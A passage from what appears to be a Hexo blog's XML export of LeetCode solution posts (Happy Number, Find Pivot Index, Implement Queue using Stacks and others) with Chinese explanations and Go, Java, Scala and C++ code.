class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data[tail];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Checks whether the circular queue is empty or not. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> head == -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Checks whether the circular queue is full or not. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isFull</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ((tail + <span class="number">1</span>) % size) == head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/design-circular-queue/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">design-circular-queue</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>561.Array Partition I</title>
    <url>/2019/05/06/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Array%20Partition%20I/</url>
    <content><![CDATA[<p>Given an array of 2n integers, your task is to group these integers into n pairs of integer, say (a1, b1), (a2, b2), …, (an, bn) which makes sum of min(ai, bi) for all i from 1 to n as large as possible.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">Input: [1,4,3,2]</span><br><span class="line"></span><br><span class="line">Output: 4</span><br><span class="line">Explanation: n is 2, and the maximum sum of pairs is 4 = min(1, 2) + min(3, 4).</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<blockquote>
<ul>
<li><p>n is a positive integer, which is in the range of [1, 10000].</p>
</li>
<li><p>All the integers in the array will be in the range of [-10000, 10000].</p>
</li>
</ul>
</blockquote>
<h1 id="题意描述"><a href="#题意描述" class="headerlink" title="题意描述"></a>题意描述</h1><p>给定 2n 个整数的数组,将数组中元素分成 n 组,每组 2 个元素。求得这 n 组中每组元素的最小值之和m,使得m尽可能大。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>先排序这个数组,求出所有元素下标是 2 的倍数的元素之和。</p>
<blockquote>
<ul>
<li>go</li>
</ul>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"sort"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ArrayPairSum</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	sort.Ints(nums)</span><br><span class="line">	sum := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(nums); i += <span class="number">2</span> &#123;</span><br><span class="line">		sum += nums[i]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/array-partition-i/discuss/?currentPage=1&amp;orderBy=recent_activity&amp;query=" target="_blank" rel="noopener">561. Array Partition I
</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>202. Happy Number</title>
    <url>/2018/08/06/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Happy%20Number/</url>
    <content><![CDATA[<p>Write an algorithm to determine if a number is “happy”.<br>A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers.<br>Example:<br>Input: 19<br>Output: true<br>Explanation:<br>1^2 + 9^2 = 82<br>8^2 + 2^2 = 68<br>6^2 + 8^2 = 100<br>1^2 + 0^2 + 0^2 = 1</p>
<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>题意是写一个算法判断一个数字是一个幸福数字。幸福数字是由以下过程定义的数字：从任何正整数开始，将数字替换为其数字的平方和，并重复该过程，直到数字等于1（它将保留），或者循环在一个不包括1的循环中无休止地。这个过程以1结尾的那些数字是幸福的数字。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isHappy</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    Set&lt;Integer&gt; inLoop = <span class="keyword">new</span> HashSet&lt;Integer&gt;();</span><br><span class="line">    <span class="keyword">int</span> squareSum,remain;</span><br><span class="line">	<span class="keyword">while</span> (inLoop.add(n)) &#123;</span><br><span class="line">		squareSum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		    remain = n%<span class="number">10</span>;</span><br><span class="line">			squareSum += remain*remain;</span><br><span class="line">			n /= <span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (squareSum == <span class="number">1</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			n = squareSum;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://en.wikipedia.org/wiki/Happy_number" target="_blank" rel="noopener">Happy number(wiki)</a></li>
<li><a href="https://leetcode.com/problems/happy-number/description/" target="_blank" rel="noopener">Happy Number</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>70. Climbing Stairs</title>
    <url>/2018/08/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Climbing%20Stairs/</url>
    <content><![CDATA[<p>You are climbing a stair case. It takes n steps to reach to the top.</p>
<p>Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top?</p>
<p>Note: Given n will be a positive integer.</p>
<blockquote>
<ul>
<li>Example 1:<br>Input: 2<br>Output: 2<br>Explanation: There are two ways to climb to the top.</li>
</ul>
<ol>
<li>1 step + 1 step</li>
<li>2 steps</li>
</ol>
<ul>
<li>Example 2:<br>Input: 3<br>Output: 3<br>Explanation: There are three ways to climb to the top.</li>
</ul>
<ol>
<li>1 step + 1 step + 1 step</li>
<li>1 step + 2 steps</li>
<li>2 steps + 1 step</li>
</ol>
</blockquote>
<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>爬楼梯,一次只能爬1或2阶,问有多少种方法爬到楼梯顶。<br>首先,当n=1时,f(1)=1;当n=2时,f(2) = 2… 发现 f(n) = f(n-1)+f(n-2)就是斐波那契数列的第n项的值。<br>典型的求解过程就是递归。此题的讨论页面有根据矩阵求解、典型的动态规划等,具体参考此题的solution tab页面。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>scala</li>
</ul>
</blockquote>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">climbStairs</span></span>(n: <span class="type">Int</span>): <span class="type">Int</span> = &#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    climbStairs(n<span class="number">-1</span>) + climbStairs(n<span class="number">-2</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/climbing-stairs/description/" target="_blank" rel="noopener">Climbing Stairs</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97" target="_blank" rel="noopener">斐波那契数列</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>724. Find Pivot Index</title>
    <url>/2019/04/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Find%20Pivot%20Index/</url>
    <content><![CDATA[<p>Given an array of integers nums, write a method that returns the “pivot” index of this array.<br>We define the pivot index as the index where the sum of the numbers to the left of the index is equal to the sum of the numbers to the right of the index.<br>If no such index exists, we should return -1. If there are multiple pivot indexes, you should return the left-most pivot index.<br>Example 1:<br>Input:<br>nums = [1, 7, 3, 6, 5, 6]<br>Output: 3<br>Explanation:<br>The sum of the numbers to the left of index 3 (nums[3] = 6) is equal to the sum of numbers to the right of index 3.<br>Also, 3 is the first index where this occurs.</p>
<p>Example 2:</p>
<p>Input:<br>nums = [1, 2, 3]<br>Output: -1<br>Explanation:<br>There is no index that satisfies the conditions in the problem statement.</p>
<p>Note:</p>
<p>The length of nums will be in the range [0, 10000].<br>Each element nums[i] will be an integer in the range [-1000, 1000].</p>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>给定一个 Integer 数组,返回一个索引位置,该位置左右两边的所有元素和相等,返回改索引.如果没有符合该条件的索引值则返回-1.</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>很容易想到几种解决方法:</p>
<blockquote>
<ul>
<li><p>先求所有元素之和,然后遍历数组，求出已经遍历的所有元素之和。总元素之和 - 已经遍历的元素之和 既是 右边元素之和,最后比较即可。</p>
</li>
<li><p>先求左边元素之和,再求右边元素之和。比较这两个值即可.</p>
</li>
</ul>
</blockquote>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>scala</li>
</ul>
</blockquote>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pivotIndex</span></span>(nums: <span class="type">Array</span>[<span class="type">Int</span>]): <span class="type">Int</span> = &#123;</span><br><span class="line">   <span class="keyword">if</span> (nums.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">   <span class="keyword">val</span> len = nums.length</span><br><span class="line">   <span class="keyword">val</span> sum = nums.sum</span><br><span class="line">   <span class="keyword">for</span> ( i &lt;- <span class="number">0</span> until len)&#123;</span><br><span class="line">     <span class="keyword">val</span> leftSum = nums.take(i).sum</span><br><span class="line">     <span class="keyword">val</span> rightSum = sum - leftSum - nums(i)</span><br><span class="line">     <span class="keyword">if</span> (leftSum == rightSum)&#123;</span><br><span class="line">       <span class="keyword">return</span> i</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>讨论区域其他答案</p>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>这个也比较容易理解,先求数组所有元素的和 S.最后遍历元素,求出遍历位置之前的所有元素之和 L,在用总元素之和减去 L。最后比较 L 和 S-L 是否相等。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pivotIndex</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> total = <span class="number">0</span>, sum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) total += num;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; sum += nums[i++])</span><br><span class="line">            <span class="keyword">if</span> (sum * <span class="number">2</span> == total - nums[i]) <span class="keyword">return</span> i;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>C++</li>
</ul>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pivotIndex</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) total += num;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.size(); sum += nums[i++])</span><br><span class="line">            <span class="keyword">if</span> (sum * <span class="number">2</span> == total - nums[i])</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>这个方法既是求左右数组的所有元素之和.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pivotIndex</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pivot = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span>[] sumOfLeftArr = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        <span class="keyword">int</span> sumOfLeft = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> sumOfRight = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;nums.length; i++) &#123;</span><br><span class="line">            sumOfLeft += nums[i-<span class="number">1</span>];</span><br><span class="line">            sumOfLeftArr[i] = sumOfLeft;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=nums.length-<span class="number">1</span>; i&gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(sumOfLeftArr[i] == sumOfRight) &#123;</span><br><span class="line">                pivot = i;</span><br><span class="line">            &#125;</span><br><span class="line">            sumOfRight += nums[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> pivot;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/find-pivot-index/solution/" target="_blank" rel="noopener">find-pivot-index</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>41. First Missing Positive</title>
    <url>/2018/12/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/First%20Missing%20Positive/</url>
    <content><![CDATA[<p>Given an unsorted integer array, find the smallest missing positive integer.<br>Example 1:<br>Input: [1,2,0]<br>Output: 3<br>Example 2:<br>Input: [3,4,-1,1]<br>Output: 2<br>Example 3:<br>Input: [7,8,9,11,12]<br>Output: 1<br>Note:<br>Your algorithm should run in O(n) time and uses constant extra space.<br><a id="more"></a></p>
<h1 id="题意描述"><a href="#题意描述" class="headerlink" title="题意描述"></a>题意描述</h1><p>从一个乱序的数组中返回第一个不在数组中的正整数。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>scala</li>
</ul>
</blockquote>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">FirstMissingPositive</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">firstMissingPositive</span></span>(nums: <span class="type">Array</span>[<span class="type">Int</span>]): <span class="type">Int</span> = &#123;</span><br><span class="line">    <span class="comment">// 数组为空返回1  </span></span><br><span class="line">    <span class="keyword">if</span> (nums.isEmpty) <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">val</span> ary = nums.sorted.distinct</span><br><span class="line">    <span class="comment">// 查找第一个大于0的数,找不到返回0</span></span><br><span class="line">    <span class="keyword">val</span> a = ary.find(p =&gt; p &gt; <span class="number">0</span>).getOrElse(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">//找到数组中最大的数</span></span><br><span class="line">    <span class="keyword">val</span> b = ary.max</span><br><span class="line">    <span class="comment">//如果找到的第一个正整数不是1,直接返回1</span></span><br><span class="line">    <span class="keyword">if</span> (a != <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="comment">//遍历最小正整数到最大正整数+1,判断是否在数组中</span></span><br><span class="line">    <span class="keyword">for</span> (i &lt;- <span class="number">2</span> to b+<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.indexOf(i) == <span class="number">-1</span>)&#123;</span><br><span class="line">          <span class="keyword">return</span> i</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/first-missing-positive/" target="_blank" rel="noopener"> First Missing Positive</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>232. Implement Queue using Stacks</title>
    <url>/2019/05/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Implement%20Queue%20using%20Stacks/</url>
    <content><![CDATA[<p>Implement the following operations of a queue using stacks.</p>
<blockquote>
<ul>
<li>push(x) — Push element x to the back of queue.</li>
<li>pop() — Removes the element from in front of queue.</li>
<li>peek() — Get the front element.</li>
<li>empty() — Return whether the queue is empty.</li>
</ul>
</blockquote>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MyQueue queue = new MyQueue();</span><br><span class="line"></span><br><span class="line">queue.push(1);</span><br><span class="line">queue.push(2);</span><br><span class="line">queue.peek();  // returns 1</span><br><span class="line">queue.pop();   // returns 1</span><br><span class="line">queue.empty(); // returns false</span><br></pre></td></tr></table></figure>
<p>Notes:</p>
<blockquote>
<ul>
<li>You must use only standard operations of a stack — which means only push to top, peek/pop from top, size, and is empty operations are valid.</li>
<li>Depending on your language, stack may not be supported natively. You may simulate a stack by using a list or deque (double-ended queue), as long as you use only standard operations of a stack.</li>
<li>You may assume that all operations are valid (for example, no pop or peek operations will be called on an empty queue).</li>
</ul>
</blockquote>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>利用栈来实现队列的功能.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>因为 java 的 Stack 集成了 Vector,利用现有的 api 即可实现基本的队列功能.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyQueue</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> Stack&lt;Integer&gt; stack;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">MyQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Push element x to the back of queue. */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">     stack.add(x);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Removes the element from in front of queue and returns that element. */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!empty())&#123;</span><br><span class="line">        <span class="keyword">return</span> stack.remove(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Get the front element. */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> stack.firstElement();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Returns whether the queue is empty. */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> stack.isEmpty();</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>利用两个栈来处理入队和出队的问题.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyQueue</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  Stack&lt;Integer&gt; input = <span class="keyword">new</span> Stack();</span><br><span class="line">  Stack&lt;Integer&gt; output = <span class="keyword">new</span> Stack();</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    input.push(x);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    peek();</span><br><span class="line">    <span class="keyword">return</span> output.pop();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (output.empty())&#123;</span><br><span class="line">      <span class="keyword">while</span> (!input.empty())&#123;</span><br><span class="line">        output.push(input.pop());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> output.peek();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> input.empty() &amp;&amp; output.empty();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/implement-queue-using-stacks/discuss?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">implement-queue-using-stacks</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>389. Find the Difference</title>
    <url>/2018/12/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Find%20the%20difference/</url>
    <content><![CDATA[<p>Given two strings s and t which consist of only lowercase letters.</p>
<p>String t is generated by random shuffling string s and then add one more letter at a random position.</p>
<p>Find the letter that was added in t.</p>
<p>Example:</p>
<p>Input:<br>s = “abcd”<br>t = “abcde”</p>
<p>Output:<br>e</p>
<p>Explanation:<br>‘e’ is the letter that was added.<br><a id="more"></a></p>
<h1 id="题意描述"><a href="#题意描述" class="headerlink" title="题意描述"></a>题意描述</h1><p>两个都是由小写字母组成的字符串s和t,t是由s中的字符随机组合和一个任意位置的一个字母组成。找到这个字母。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>本题根本上是简化版的求最大的公共子串,排序两个字符串后将t的公共子串部分截取,剩下的字符既是要求的字符。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>scala</li>
</ul>
</blockquote>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> util.control.<span class="type">Breaks</span>._</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">FindtheDifference</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">findTheDifference</span></span>(s: <span class="type">String</span>, t: <span class="type">String</span>): <span class="type">Char</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> a = t.sorted</span><br><span class="line">    <span class="keyword">val</span> b = s.sorted</span><br><span class="line">    <span class="keyword">val</span> sb = <span class="keyword">new</span> <span class="type">StringBuilder</span></span><br><span class="line">    breakable(<span class="keyword">for</span> (i&lt;<span class="number">-0</span> until b.length)&#123;</span><br><span class="line">        <span class="keyword">if</span> (a.charAt(i).equals(b.charAt(i))) &#123;</span><br><span class="line">            sb.append(a.charAt(i))</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">break</span>()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    a.replaceFirst(sb.toString.sorted,<span class="string">""</span>).charAt(<span class="number">0</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/find-the-difference/" target="_blank" rel="noopener"> Find the Difference</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>77. Combinations</title>
    <url>/2018/08/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Combinations/</url>
    <content><![CDATA[<p>Given two integers n and k, return all possible combinations of k numbers out of 1 … n。<br>Example:<br>Input: n = 4, k = 2<br>Output:<br>[<br>  [2,4],<br>  [3,4],<br>  [2,3],<br>  [1,2],<br>  [1,3],<br>  [1,4],<br>]</p>
<h1 id="题意描述"><a href="#题意描述" class="headerlink" title="题意描述"></a>题意描述</h1><p>给定两个int数字n,k。 返回所有1到n之间的k个数字的所有组合。解题思路类似数学中的排列组合,$C^k_n=\frac{n!}{k!(n-k)!}$</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>scala</li>
</ul>
</blockquote>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/combinations/description/" target="_blank" rel="noopener">combinations</a></li>
<li><a href="https://en.wikipedia.org/wiki/Combination" target="_blank" rel="noopener">Combination wiki</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>703. Kth Largest Element in a Stream</title>
    <url>/2019/05/25/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Kth%20Largest%20Element%20in%20a%20Stream/</url>
    <content><![CDATA[<p>Design a class to find the kth largest element in a stream. Note that it is the kth largest element in the sorted order, not the kth distinct element.</p>
<p>Your KthLargest class will have a constructor which accepts an integer k and an integer array nums, which contains initial elements from the stream. For each call to the method KthLargest.add, return the element representing the kth largest element in the stream.</p>
